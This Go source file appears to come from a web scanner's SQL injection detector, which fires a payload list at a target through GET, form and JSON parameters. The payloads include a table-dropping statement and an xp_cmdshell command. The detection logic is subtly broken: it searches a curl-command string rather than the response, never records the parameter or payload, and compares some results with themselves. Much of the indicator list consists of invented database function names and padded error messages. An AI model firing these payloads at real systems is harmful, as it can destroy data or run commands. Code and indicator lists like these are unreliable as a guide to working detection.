package scanner

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"os"
	"strings"
	"time"

	"github.com/gleicon/sonnel/internal/evidence"
	"github.com/gleicon/sonnel/internal/models"
)

// SQLInjectionResult represents the result of a SQL injection test
type SQLInjectionResult struct {
	Parameter      string
	Payload        string
	Status         int
	ResponseTime   time.Duration
	ResponseLength int
	Evidence       *evidence.Evidence
	IsVulnerable   bool
	Indicators     []string
}

// SQLInjectionDetector handles SQL injection testing
type SQLInjectionDetector struct {
	scanner      *Scanner
	evidenceColl *evidence.EvidenceCollector
	verbose      bool
}

// NewSQLInjectionDetector creates a new SQL injection detector
func NewSQLInjectionDetector(scanner *Scanner, verbose bool) (*SQLInjectionDetector, error) {
	evidenceColl, err := evidence.NewEvidenceCollector("evidence")
	if err != nil {
		return nil, fmt.Errorf("failed to create evidence collector: %v", err)
	}

	return &SQLInjectionDetector{
		scanner:      scanner,
		evidenceColl: evidenceColl,
		verbose:      verbose,
	}, nil
}

// SQLInjectionPayloads contains common SQL injection test payloads
var SQLInjectionPayloads = []string{
	// Basic payloads
	"' OR '1'='1",
	"' OR 1=1--",
	"admin'--",
	"1' ORDER BY 1--",
	"1' UNION SELECT NULL--",
	"1' AND 1=1--",
	"1' AND 1=0--",

	// Error-based payloads
	"' AND extractvalue(1,concat(0x7e,version()))--",
	"' AND updatexml(1,concat(0x7e,version()),1)--",
	"' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),0x7e,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",

	// Time-based payloads
	"' AND SLEEP(5)--",
	"' AND BENCHMARK(10000000,MD5('a'))--",
	"' AND pg_sleep(5)--",
	"' AND WAITFOR DELAY '0:0:5'--",

	// Boolean-based payloads
	"' AND (SELECT * FROM (SELECT(SLEEP(5-(IF(1=1,0,5)))))a)--",
	"' AND (SELECT * FROM (SELECT(SLEEP(5-(IF(1=0,0,5)))))a)--",

	// Stacked queries
	"'; EXEC xp_cmdshell('whoami')--",
	"'; DROP TABLE users--",
	"'; SELECT * FROM users WHERE '1'='1",

	// Bypass filters
	"' OR '1'='1' /*",
	"' OR '1'='1' -- -",
	"' OR '1'='1' #",
	"' OR '1'='1' --",
	"' OR '1'='1' /*!50000union*/",
	"' OR '1'='1' /*!union*/",
	"' OR '1'='1' /*!50000select*/",
	"' OR '1'='1' /*!select*/",
}

// SQLInjectionIndicators contains patterns that indicate SQL injection
var SQLInjectionIndicators = []string{
	"SQL syntax",
	"mysql_fetch_array",
	"mysql_fetch_assoc",
	"mysql_fetch_row",
	"mysql_num_rows",
	"mysql_result",
	"mysql_query",
	"mysql_connect",
	"mysql_select_db",
	"mysql_error",
	"mysql_errno",
	"mysql_close",
	"mysql_free_result",
	"mysql_get_client_info",
	"mysql_get_host_info",
	"mysql_get_proto_info",
	"mysql_get_server_info",
	"mysql_info",
	"mysql_insert_id",
	"mysql_list_dbs",
	"mysql_list_fields",
	"mysql_list_processes",
	"mysql_list_tables",
	"mysql_ping",
	"mysql_real_escape_string",
	"mysql_stat",
	"mysql_thread_id",
	"mysql_unbuffered_query",
	"mysql_warning_count",
	"mysqli_connect",
	"mysqli_query",
	"mysqli_fetch_array",
	"mysqli_fetch_assoc",
	"mysqli_fetch_row",
	"mysqli_num_rows",
	"mysqli_result",
	"mysqli_error",
	"mysqli_errno",
	"mysqli_close",
	"mysqli_free_result",
	"mysqli_get_client_info",
	"mysqli_get_host_info",
	"mysqli_get_proto_info",
	"mysqli_get_server_info",
	"mysqli_info",
	"mysqli_insert_id",
	"mysqli_list_dbs",
	"mysqli_list_fields",
	"mysqli_list_processes",
	"mysqli_list_tables",
	"mysqli_ping",
	"mysqli_real_escape_string",
	"mysqli_stat",
	"mysqli_thread_id",
	"mysqli_unbuffered_query",
	"mysqli_warning_count",
	"pg_connect",
	"pg_query",
	"pg_fetch_array",
	"pg_fetch_assoc",
	"pg_fetch_row",
	"pg_num_rows",
	"pg_result",
	"pg_error",
	"pg_errno",
	"pg_close",
	"pg_free_result",
	"pg_get_client_info",
	"pg_get_host_info",
	"pg_get_proto_info",
	"pg_get_server_info",
	"pg_info",
	"pg_insert_id",
	"pg_list_dbs",
	"pg_list_fields",
	"pg_list_processes",
	"pg_list_tables",
	"pg_ping",
	"pg_real_escape_string",
	"pg_stat",
	"pg_thread_id",
	"pg_unbuffered_query",
	"pg_warning_count",
	"sqlite3_open",
	"sqlite3_query",
	"sqlite3_fetch_array",
	"sqlite3_fetch_assoc",
	"sqlite3_fetch_row",
	"sqlite3_num_rows",
	"sqlite3_result",
	"sqlite3_error",
	"sqlite3_errno",
	"sqlite3_close",
	"sqlite3_free_result",
	"sqlite3_get_client_info",
	"sqlite3_get_host_info",
	"sqlite3_get_proto_info",
	"sqlite3_get_server_info",
	"sqlite3_info",
	"sqlite3_insert_id",
	"sqlite3_list_dbs",
	"sqlite3_list_fields",
	"sqlite3_list_processes",
	"sqlite3_list_tables",
	"sqlite3_ping",
	"sqlite3_real_escape_string",
	"sqlite3_stat",
	"sqlite3_thread_id",
	"sqlite3_unbuffered_query",
	"sqlite3_warning_count",
	"ODBC",
	"SQLite",
	"PostgreSQL",
	"MySQL",
	"Microsoft SQL Server",
	"Oracle",
	"DB2",
	"SQL syntax",
	"unexpected token",
	"unexpected end of SQL command",
	"unterminated quoted string",
	"unterminated identifier",
	"unterminated comment",
	"unterminated string literal",
	"unterminated dollar-quoted string",
	"unterminated escape sequence",
	"unterminated bit string",
	"unterminated hex string",
	"unterminated binary string",
	"unterminated national string",
	"unterminated Unicode string",
	"unterminated raw string",
	"unterminated quoted identifier",
	"unterminated dollar-quoted identifier",
	"unterminated escape identifier",
	"unterminated Unicode identifier",
	"unterminated raw identifier",
	"unterminated quoted string literal",
	"unterminated dollar-quoted string literal",
	"unterminated escape string literal",
	"unterminated Unicode string literal",
	"unterminated raw string literal",
	"unterminated quoted identifier literal",
	"unterminated dollar-quoted identifier literal",
	"unterminated escape identifier literal",
	"unterminated Unicode identifier literal",
	"unterminated raw identifier literal",
}

// DetectSQLInjection checks for SQL injection vulnerabilities
func (sid *SQLInjectionDetector) DetectSQLInjection(targetURL string) ([]models.Vulnerability, error) {
	var vulnerabilities []models.Vulnerability

	// Test GET parameters
	getVulns, err := sid.testGETParameters(targetURL)
	if err != nil {
		return nil, fmt.Errorf("error testing GET parameters: %v", err)
	}
	vulnerabilities = append(vulnerabilities, getVulns...)

	// Test POST parameters
	postVulns, err := sid.testPOSTParameters(targetURL)
	if err != nil {
		return nil, fmt.Errorf("error testing POST parameters: %v", err)
	}
	vulnerabilities = append(vulnerabilities, postVulns...)

	// Test timing-based injection
	timingVulns, err := sid.testTimingInjection(targetURL)
	if err != nil {
		return nil, fmt.Errorf("error testing timing-based injection: %v", err)
	}
	vulnerabilities = append(vulnerabilities, timingVulns...)

	return vulnerabilities, nil
}

// testGETParameters tests GET parameters for SQL injection
func (sid *SQLInjectionDetector) testGETParameters(targetURL string) ([]models.Vulnerability, error) {
	var vulnerabilities []models.Vulnerability

	// Parse the target URL
	parsedURL, err := url.Parse(targetURL)
	if err != nil {
		return nil, fmt.Errorf("failed to parse target URL: %v", err)
	}

	query := parsedURL.Query()
	for param := range query {
		// Get baseline response
		baseline, err := sid.sendRequest(parsedURL.String())
		if err != nil {
			return nil, err
		}

		// Test each payload
		for _, payload := range SQLInjectionPayloads {
			// Create new URL with injected parameter
			newQuery := url.Values{}
			for k, v := range query {
				newQuery[k] = v
			}
			newQuery.Set(param, payload)
			newURL := *parsedURL
			newURL.RawQuery = newQuery.Encode()

			// Send request with payload
			result, err := sid.sendRequest(newURL.String())
			if err != nil {
				continue
			}

			// Check for SQL injection indicators
			indicators := sid.checkIndicators(result, baseline)
			if len(indicators) > 0 {
				result.IsVulnerable = true
				result.Indicators = indicators
				vulnerabilities = append(vulnerabilities, sid.createVulnerability(result))
			}
		}
	}

	return vulnerabilities, nil
}

// testPOSTParameters tests POST parameters for SQL injection
func (sid *SQLInjectionDetector) testPOSTParameters(parsedURL string) ([]models.Vulnerability, error) {
	var vulnerabilities []models.Vulnerability

	// Test form-encoded POST
	formVulns, err := sid.testFormPOST(parsedURL)
	if err != nil {
		return nil, err
	}
	vulnerabilities = append(vulnerabilities, formVulns...)

	// Test JSON POST
	jsonVulns, err := sid.testJSONPOST(parsedURL)
	if err != nil {
		return nil, err
	}
	vulnerabilities = append(vulnerabilities, jsonVulns...)

	return vulnerabilities, nil
}

// testFormPOST tests form-encoded POST parameters
func (sid *SQLInjectionDetector) testFormPOST(parsedURL string) ([]models.Vulnerability, error) {
	var vulnerabilities []models.Vulnerability

	// Common form parameters to test
	formParams := map[string]string{
		"email":    "test@example.com",
		"username": "testuser",
		"password": "testpass",
		"search":   "test",
		"query":    "test",
		"id":       "1",
	}

	// Test each parameter with each payload
	for param := range formParams {
		for _, payload := range SQLInjectionPayloads {
			// Create new form data with injected parameter
			newParams := make(map[string]string)
			for k, v := range formParams {
				if k == param {
					newParams[k] = payload
				} else {
					newParams[k] = v
				}
			}

			// Send request with payload
			result, err := sid.sendFormRequest(parsedURL, newParams)
			if err != nil {
				continue
			}

			// Check for SQL injection indicators
			indicators := sid.checkIndicators(result, result)
			if len(indicators) > 0 {
				result.IsVulnerable = true
				result.Indicators = indicators
				vulnerabilities = append(vulnerabilities, sid.createVulnerability(result))
			}
		}
	}

	return vulnerabilities, nil
}

// testJSONPOST tests JSON POST parameters
func (sid *SQLInjectionDetector) testJSONPOST(parsedURL string) ([]models.Vulnerability, error) {
	var vulnerabilities []models.Vulnerability

	// Common JSON parameters to test
	jsonParams := map[string]interface{}{
		"email":    "test@example.com",
		"username": "testuser",
		"password": "testpass",
		"search":   "test",
		"query":    "test",
		"id":       1,
	}

	// Test each parameter with each payload
	for param := range jsonParams {
		for _, payload := range SQLInjectionPayloads {
			// Create new JSON data with injected parameter
			newParams := make(map[string]interface{})
			for k, v := range jsonParams {
				if k == param {
					newParams[k] = payload
				} else {
					newParams[k] = v
				}
			}

			// Send request with payload
			result, err := sid.sendJSONRequest(parsedURL, newParams)
			if err != nil {
				continue
			}

			// Check for SQL injection indicators
			indicators := sid.checkIndicators(result, result)
			if len(indicators) > 0 {
				result.IsVulnerable = true
				result.Indicators = indicators
				vulnerabilities = append(vulnerabilities, sid.createVulnerability(result))
			}
		}
	}

	return vulnerabilities, nil
}

// sendRequest sends a GET request and returns the result
func (sid *SQLInjectionDetector) sendRequest(url string) (SQLInjectionResult, error) {
	start := time.Now()
	req, err := http.NewRequest("GET", url, nil)
	if err != nil {
		return SQLInjectionResult{}, err
	}

	resp, err := sid.scanner.client.Do(req)
	if err != nil {
		return SQLInjectionResult{}, err
	}
	defer resp.Body.Close()

	// Read response body
	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return SQLInjectionResult{}, err
	}

	// Collect evidence
	ev, err := sid.evidenceColl.CollectEvidence(url, req, resp)
	if err != nil {
		return SQLInjectionResult{}, err
	}

	return SQLInjectionResult{
		Status:         resp.StatusCode,
		ResponseTime:   time.Since(start),
		ResponseLength: len(body),
		Evidence:       ev,
	}, nil
}

// sendFormRequest sends a form-encoded POST request
func (sid *SQLInjectionDetector) sendFormRequest(url string, params map[string]string) (SQLInjectionResult, error) {
	// Construct form data manually
	var formData strings.Builder
	for k, v := range params {
		if formData.Len() > 0 {
			formData.WriteByte('&')
		}
		formData.WriteString(k)
		formData.WriteByte('=')
		formData.WriteString(v)
	}

	start := time.Now()
	req, err := http.NewRequest("POST", url, strings.NewReader(formData.String()))
	if err != nil {
		return SQLInjectionResult{}, err
	}
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")

	resp, err := sid.scanner.client.Do(req)
	if err != nil {
		return SQLInjectionResult{}, err
	}
	defer resp.Body.Close()

	// Read response body
	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return SQLInjectionResult{}, err
	}

	// Collect evidence
	ev, err := sid.evidenceColl.CollectEvidence(url, req, resp)
	if err != nil {
		return SQLInjectionResult{}, err
	}

	return SQLInjectionResult{
		Status:         resp.StatusCode,
		ResponseTime:   time.Since(start),
		ResponseLength: len(body),
		Evidence:       ev,
	}, nil
}

// sendJSONRequest sends a JSON POST request
func (sid *SQLInjectionDetector) sendJSONRequest(url string, params map[string]interface{}) (SQLInjectionResult, error) {
	jsonData, err := json.Marshal(params)
	if err != nil {
		return SQLInjectionResult{}, err
	}

	start := time.Now()
	req, err := http.NewRequest("POST", url, bytes.NewBuffer(jsonData))
	if err != nil {
		return SQLInjectionResult{}, err
	}
	req.Header.Set("Content-Type", "application/json")

	resp, err := sid.scanner.client.Do(req)
	if err != nil {
		return SQLInjectionResult{}, err
	}
	defer resp.Body.Close()

	// Read response body
	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return SQLInjectionResult{}, err
	}

	// Collect evidence
	ev, err := sid.evidenceColl.CollectEvidence(url, req, resp)
	if err != nil {
		return SQLInjectionResult{}, err
	}

	return SQLInjectionResult{
		Status:         resp.StatusCode,
		ResponseTime:   time.Since(start),
		ResponseLength: len(body),
		Evidence:       ev,
	}, nil
}

// checkIndicators checks for SQL injection indicators in the response
func (sid *SQLInjectionDetector) checkIndicators(result, baseline SQLInjectionResult) []string {
	var indicators []string

	// Check for SQL error messages in response
	body := string(result.Evidence.CurlCommand)
	for _, indicator := range SQLInjectionIndicators {
		if strings.Contains(strings.ToLower(body), strings.ToLower(indicator)) {
			indicators = append(indicators, fmt.Sprintf("Found SQL indicator: %s", indicator))
		}
	}

	// Check for significant response length difference
	lengthDiff := abs(result.ResponseLength - baseline.ResponseLength)
	if lengthDiff > 1000 { // Threshold for significant difference
		indicators = append(indicators, fmt.Sprintf("Significant response length difference: %d bytes", lengthDiff))
	}

	// Check for timing-based injection
	if result.ResponseTime > baseline.ResponseTime+time.Second*5 {
		indicators = append(indicators, "Potential timing-based injection detected")
	}

	// Check for status code changes
	if result.Status != baseline.Status {
		indicators = append(indicators, fmt.Sprintf("Status code changed from %d to %d", baseline.Status, result.Status))
	}

	return indicators
}

// createVulnerability creates a Vulnerability from a SQLInjectionResult
func (sid *SQLInjectionDetector) createVulnerability(result SQLInjectionResult) models.Vulnerability {
	return models.Vulnerability{
		Title:       "SQL Injection Vulnerability",
		Description: fmt.Sprintf("SQL injection detected in parameter '%s' with payload '%s'", result.Parameter, result.Payload),
		Severity:    models.High,
		Category:    models.CategoryInjection,
		URL:         result.Evidence.URL,
		Evidence:    result.Evidence,
		Remediation: "Implement proper input validation and use parameterized queries or prepared statements.",
	}
}

// abs returns the absolute value of an integer
func abs(x int) int {
	if x < 0 {
		return -x
	}
	return x
}

// testTimingInjection tests for timing-based SQL injection
func (sid *SQLInjectionDetector) testTimingInjection(targetURL string) ([]models.Vulnerability, error) {
	var vulnerabilities []models.Vulnerability

	// Define timing-based payloads
	timingPayloads := []string{
		"' AND SLEEP(5)--",
		"' AND BENCHMARK(10000000,MD5('a'))--",
		"' AND pg_sleep(5)--",
		"' AND WAITFOR DELAY '0:0:5'--",
	}

	// Test each payload
	for _, payload := range timingPayloads {
		// Send normal request to get baseline timing
		normalResult, err := sid.sendRequest(targetURL)
		if err != nil {
			continue
		}
		normalTime := normalResult.ResponseTime

		// Send request with timing payload
		payloadResult, err := sid.sendRequest(targetURL + "?id=" + url.QueryEscape(payload))
		if err != nil {
			continue
		}
		payloadTime := payloadResult.ResponseTime

		// Check if response time is significantly longer
		if payloadTime > normalTime*2 {
			vulnerabilities = append(vulnerabilities, models.Vulnerability{
				Title:       "Time-Based SQL Injection",
				Description: fmt.Sprintf("Time-based SQL injection vulnerability found with payload: %s", payload),
				Severity:    models.High,
				Category:    models.CategoryInjection,
				URL:         targetURL,
				Evidence:    payloadResult.Evidence,
				Remediation: "Use parameterized queries or prepared statements to prevent SQL injection",
			})
		}
	}

	return vulnerabilities, nil
}

// isSQLInjectionVulnerable checks if the response indicates a SQL injection vulnerability
func (sid *SQLInjectionDetector) isSQLInjectionVulnerable(result SQLInjectionResult) bool {
	// Check for common SQL error messages in the response
	if result.Evidence.LogPath == "" {
		return false
	}

	// Read the log file
	body, err := os.ReadFile(result.Evidence.LogPath)
	if err != nil {
		return false
	}

	bodyStr := string(body)

	// Check for error-based indicators
	for _, indicator := range SQLInjectionIndicators {
		if strings.Contains(bodyStr, indicator) {
			return true
		}
	}

	// Check for boolean-based indicators
	if strings.Contains(bodyStr, "error") || strings.Contains(bodyStr, "exception") {
		return true
	}

	// Check for content length differences
	if result.ResponseLength > 0 && result.ResponseLength < 1000 {
		return true
	}

	return false
}
